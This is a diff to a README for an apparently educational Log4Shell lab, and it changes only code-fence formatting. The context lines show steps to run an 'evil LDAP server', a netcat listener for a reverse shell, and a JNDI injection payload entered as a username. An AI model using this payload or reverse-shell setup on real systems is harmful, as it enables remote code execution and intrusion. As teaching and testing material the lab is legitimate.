@@ -123,7 +123,7 @@ You will notice that in the logs, an error statement is logged containing the us
 ### 4b startup the evil LDAP server
 From the root of the project do the following
 
-```java
+```
 cd exploits/log4shell-server/
 mvn clean package 
 mvn exec:java
@@ -131,7 +131,7 @@ mvn exec:java
 
 ### 4c Launch netcat
 In a new terminal window launch netcat listening to port 9001
-```java
+```
 ncat -lvp 9001
 ```
 
@@ -142,7 +142,7 @@ This payload will try to execute following statement to create a reversed shell:
 From your docker container connect tot the LDAP server on you local machine
 
 Use below as the username with any given password 
-```java
+```
 ${jndi:ldap://host.docker.internal:9999/Commons}
 ```
 
